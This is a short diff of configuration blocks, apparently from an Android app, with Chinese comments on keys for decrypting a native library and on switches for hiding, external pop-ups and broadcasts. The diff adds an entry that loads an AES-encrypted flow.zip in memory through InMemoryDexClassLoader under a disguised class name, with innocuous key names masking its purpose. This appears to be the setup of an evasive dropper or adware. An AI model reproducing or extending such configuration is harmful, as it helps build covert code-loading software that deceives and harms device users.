@@ -10,7 +10,8 @@ A:
   "display_ids": "981772962-981772963",
   "file_decr": "LKjc67N3JeKL3mks",
   "one_fell": "K4vnjf9VNJ32oVNK",
-  "feature_switches": "nerfeel-kaskel-jimite-kedmob"
+  "feature_switches": "nerfeel-kaskel-jimite-kedmob",
+  "loader_vacation": "flow.zip-AES-dalvik.system.InMemoryDexClassLoader-com.helico.bacter.pylori-a"
 }
 B:
 {
@@ -57,7 +58,8 @@ B:
   // 解密so的key
   "one_fell": "K4vnjf9VNJ32oVNK",
   // 隐藏/外弹/广播/文件开关 和So的信息依依对应
-  "feature_switches": "nerfeel-kaskel-jimite-kedmob"
+  "feature_switches": "nerfeel-kaskel-jimite-kedmob",
+  "loader_vacation": "flow.zip-AES-dalvik.system.InMemoryDexClassLoader-com.helico.bacter.pylori-a"
 }
 
 //android.os.Build.VERSION_CODES.Q
